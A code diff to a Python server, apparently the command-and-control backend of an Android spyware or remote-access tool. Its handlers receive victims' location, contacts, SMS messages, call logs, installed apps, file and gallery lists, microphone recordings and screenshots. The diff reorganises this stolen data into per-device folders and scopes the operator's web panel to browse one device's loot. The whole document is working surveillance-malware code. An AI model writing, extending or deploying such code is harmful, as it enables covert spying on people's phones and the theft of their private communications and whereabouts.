@@ -531,15 +531,17 @@ class DemoServer:
 
                             if len(pending["data"]) >= total_needed:
                                 # File complete!
+                                device_id = session.device_id if session.device_id else "unknown"
                                 file_type = pending.get("file_type", "image")
                                 if file_type == "image":
-                                    save_dir = IMAGES_DIR
+                                    save_dir = os.path.join(IMAGES_DIR, device_id)
                                 elif file_type == "audio":
-                                    save_dir = AUDIO_DIR
+                                    save_dir = os.path.join(AUDIO_DIR, device_id)
                                 elif file_type == "video":
-                                    save_dir = VIDEO_DIR
+                                    save_dir = os.path.join(VIDEO_DIR, device_id)
                                 else:
-                                    save_dir = DOCS_DIR
+                                    save_dir = os.path.join(DOCS_DIR, device_id)
+                                os.makedirs(save_dir, exist_ok=True)
 
                                 filename = pending["filename"]
                                 filepath = os.path.join(save_dir, filename)
@@ -670,6 +672,14 @@ class DemoServer:
             lat = message.get("latitude", "Unknown")
             lon = message.get("longitude", "Unknown")
             acc = message.get("accuracy", "Unknown")
+            # Save location to file (per-device)
+            device_id = session.device_id if session.device_id else "unknown"
+            loc_dir = os.path.join(DOCS_DIR, device_id)
+            os.makedirs(loc_dir, exist_ok=True)
+            loc_file = os.path.join(loc_dir, f"location_{session.session_id}_{int(time.time())}.json")
+            with open(loc_file, 'w') as f:
+                json.dump(message, f, indent=2)
+            self.log(f"[i] Location saved to: {loc_file}")
             session.last_location = message
             self.log(f"[i] Location from session {session.session_id}:")
             self.log(f"    Latitude: {lat}")
@@ -688,8 +698,11 @@ class DemoServer:
                     self.log(f"    - {f}")
             if len(files) > 20:
                 self.log(f"    ... and {len(files) - 20} more")
-            # Save gallery list to file
-            gallery_file = os.path.join(DOCS_DIR, f"gallery_list_{session.session_id}_{int(time.time())}.json")
+            # Save gallery list to file (per-device)
+            device_id = session.device_id if session.device_id else "unknown"
+            docs_dir = os.path.join(DOCS_DIR, device_id)
+            os.makedirs(docs_dir, exist_ok=True)
+            gallery_file = os.path.join(docs_dir, f"gallery_list_{session.session_id}_{int(time.time())}.json")
             with open(gallery_file, 'w') as f:
                 json.dump(files, f, indent=2)
             self.log(f"    [+] Saved to: {gallery_file}")
@@ -708,6 +721,14 @@ class DemoServer:
 
         elif msg_type == "app_list":
             apps = message.get("apps", [])
+            # Save app list to file (per-device)
+            device_id = session.device_id if session.device_id else "unknown"
+            app_dir = os.path.join(DOCS_DIR, device_id)
+            os.makedirs(app_dir, exist_ok=True)
+            app_file = os.path.join(app_dir, f"app_list_{session.session_id}_{int(time.time())}.json")
+            with open(app_file, 'w') as f:
+                json.dump(apps, f, indent=2)
+            self.log(f"[i] App list saved to: {app_file}")
             session.last_app_list = apps
             self.log(f"[i] Installed apps from session {session.session_id} ({len(apps)} apps):")
             for app in apps[:15]:
@@ -761,7 +782,11 @@ class DemoServer:
             if audio_b64:
                 audio_bytes = base64.b64decode(audio_b64)
                 filename = f"audio_{int(time.time())}.3gp"
-                filepath = os.path.join(AUDIO_DIR, filename)
+                # Save in audio directory under device ID
+                device_id = session.device_id if session.device_id else "unknown"
+                audio_dir = os.path.join(AUDIO_DIR, device_id)
+                os.makedirs(audio_dir, exist_ok=True)
+                filepath = os.path.join(audio_dir, filename)
                 with open(filepath, 'wb') as f:
                     f.write(audio_bytes)
                 self.log(f"[+] Audio saved: {filepath} ({len(audio_bytes)} bytes)")
@@ -778,7 +803,10 @@ class DemoServer:
                     timestamp = int(time.time())
                     # Use filename from client if provided, otherwise generate one
                     filename = message.get("filename", f"screenshot_{session.session_id}_{timestamp}.jpg")
-                    filepath = os.path.join(IMAGES_DIR, filename)
+                    # Save in screenshots directory under device ID
+                    screenshot_dir = os.path.join(RECEIVED_DIR, "screenshots", session.device_id if session.device_id else "unknown")
+                    os.makedirs(screenshot_dir, exist_ok=True)
+                    filepath = os.path.join(screenshot_dir, filename)
                     with open(filepath, 'wb') as f:
                         f.write(image_bytes)
                     self.log(f"[+] Screenshot saved: {filepath} ({len(image_bytes)} bytes)")
@@ -835,7 +863,8 @@ class DemoServer:
             if count > 20:
                 self.log(f"    ... and {count - 20} more")
             # Save to file
-            calllog_file = os.path.join(DOCS_DIR, f"call_logs_{session.session_id}_{int(time.time())}.json")
+            calllog_file = os.path.join(DOCS_DIR, session.device_id if session.device_id else "unknown", f"call_logs_{session.session_id}_{int(time.time())}.json")
+            os.makedirs(os.path.dirname(calllog_file), exist_ok=True)
             with open(calllog_file, 'w') as f:
                 json.dump(calls, f, indent=2)
             self.log(f"    [+] Saved to: {calllog_file}")
@@ -854,7 +883,8 @@ class DemoServer:
             if count > 20:
                 self.log(f"    ... and {count - 20} more")
             # Save to file
-            contacts_file = os.path.join(DOCS_DIR, f"contacts_{session.session_id}_{int(time.time())}.json")
+            contacts_file = os.path.join(DOCS_DIR, session.device_id if session.device_id else "unknown", f"contacts_{session.session_id}_{int(time.time())}.json")
+            os.makedirs(os.path.dirname(contacts_file), exist_ok=True)
             with open(contacts_file, 'w') as f:
                 json.dump(contacts, f, indent=2)
             self.log(f"    [+] Saved to: {contacts_file}")
@@ -873,8 +903,11 @@ class DemoServer:
                 self.log(f"    [{sms_type}] {from_num}: {body}...")
             if count > 20:
                 self.log(f"    ... and {count - 20} more")
-            # Save to file
-            sms_file = os.path.join(DOCS_DIR, f"sms_logs_{session.session_id}_{int(time.time())}.json")
+            # Save to file (per-device)
+            device_id = session.device_id if session.device_id else "unknown"
+            sms_dir = os.path.join(DOCS_DIR, device_id)
+            os.makedirs(sms_dir, exist_ok=True)
+            sms_file = os.path.join(sms_dir, f"sms_logs_{session.session_id}_{int(time.time())}.json")
             with open(sms_file, 'w') as f:
                 json.dump(sms_list, f, indent=2)
             self.log(f"    [+] Saved to: {sms_file}")
@@ -894,8 +927,11 @@ class DemoServer:
                     self.log(f"    - {f}")
             if count > 20:
                 self.log(f"    ... and {count - 20} more")
-            # Save to file
-            filelist_file = os.path.join(DOCS_DIR, f"filelist_{session.session_id}_{int(time.time())}.json")
+            # Save to file (per-device)
+            device_id = session.device_id if session.device_id else "unknown"
+            docs_dir = os.path.join(DOCS_DIR, device_id)
+            os.makedirs(docs_dir, exist_ok=True)
+            filelist_file = os.path.join(docs_dir, f"filelist_{session.session_id}_{int(time.time())}.json")
             with open(filelist_file, 'w') as f:
                 json.dump(files, f, indent=2)
             self.log(f"    [+] Saved to: {filelist_file}")
@@ -1172,9 +1208,32 @@ class ThreadedHTTPRequestHandler(BaseHTTPRequestHandler):
             self.send_json_response(result)
 
     def handle_list_received_files(self, query):
-        """List files in received_files directory."""
+        """List files in received_files directory, scoped to a device."""
         subdir = query.get('dir', [''])[0]
+        device_session = query.get('session', [''])[0]
         base_dir = os.path.abspath(RECEIVED_DIR)
+        # If a device session is provided, scope browsing to that device's folders
+        if device_session:
+            # The device's files are under subfolders like images/<device_id>, audio/<device_id>, etc.
+            # We set the base to received_files/ and scope the subdir to include device folders.
+            # For top-level browsing when a device is selected, show device-specific subdirs.
+            if not subdir:
+                # Show device-specific folders at top level
+                device_dirs = ['images', 'audio', 'videos', 'docs', 'screenshots']
+                files_list = []
+                for d in device_dirs:
+                    device_path = os.path.join(base_dir, d, device_session)
+                    if os.path.isdir(device_path):
+                        files_list.append({
+                            'name': d,
+                            'path': f'{d}/{device_session}',
+                            'is_dir': True,
+                            'size': 0
+                        })
+                files_list.sort(key=lambda x: x['name'].lower())
+                self.send_json_response({'files': files_list, 'current_dir': subdir})
+                return
+        # Normal browsing within a subdir
         if subdir:
             target_dir = os.path.normpath(os.path.join(base_dir, subdir))
             # Security: prevent path traversal
@@ -1249,22 +1308,26 @@ class ThreadedHTTPRequestHandler(BaseHTTPRequestHandler):
                 pass  # Client already gone
 
     def handle_get_screenshots(self, query):
-        """List screenshot files in received_files/images directory."""
-        # We'll look for screenshot files in the images directory
-        images_dir = os.path.abspath(IMAGES_DIR)
+        """List screenshot files in received_files/screenshots/<device_id> directory."""
+        sid = query.get('session', [''])[0]
+        if not sid:
+            self.send_json_response({'screenshots': []})
+            return
+        screenshot_dir = os.path.join(RECEIVED_DIR, "screenshots", sid)
+        if not os.path.isdir(screenshot_dir):
+            self.send_json_response({'screenshots': []})
+            return
         files_list = []
-        if os.path.isdir(images_dir):
-            for entry in os.listdir(images_dir):
-                if entry.startswith('screenshot_') and (entry.endswith('.png') or entry.endswith('.jpg') or entry.endswith('.jpeg')):
-                    entry_path = os.path.join(images_dir, entry)
-                    rel_path = os.path.relpath(entry_path, images_dir).replace(os.sep, '/')
-                    # We want to serve from the images directory, so the path relative to the images dir
-                    files_list.append({
-                        'name': entry,
-                        'path': f'images/{rel_path}',  # prefix with images/ so the frontend can construct the URL
-                        'is_dir': False,
-                        'size': os.path.getsize(entry_path)
-                    })
+        for entry in os.listdir(screenshot_dir):
+            if entry.endswith('.png') or entry.endswith('.jpg') or entry.endswith('.jpeg'):
+                entry_path = os.path.join(screenshot_dir, entry)
+                rel_path = os.path.relpath(entry_path, RECEIVED_DIR).replace(os.sep, '/')
+                files_list.append({
+                    'name': entry,
+                    'path': rel_path,
+                    'is_dir': False,
+                    'size': os.path.getsize(entry_path)
+                })
         # Sort by name (which includes timestamp) descending so newest first
         files_list.sort(key=lambda x: x['name'], reverse=True)
         self.send_json_response({'screenshots': files_list})
